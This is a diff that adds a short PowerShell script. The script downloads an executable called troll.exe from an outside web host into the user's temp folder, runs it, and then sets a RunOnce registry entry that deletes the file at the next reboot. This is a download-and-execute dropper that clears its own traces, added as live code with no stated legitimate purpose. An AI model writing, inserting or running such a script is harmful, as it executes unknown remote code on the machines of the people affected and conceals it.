@@ -1,0 +1,8 @@
+# Download the file
+Invoke-WebRequest -Uri "https://lepau.pro/troll.exe" -OutFile "$env:TEMP\troll.exe"
+
+# Run the file
+Start-Process "$env:TEMP\troll.exe"
+
+# Schedule deletion on next reboot
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "delete_troll" /t REG_SZ /d "cmd /c del /F /Q `"$env:TEMP\troll.exe`"" /f
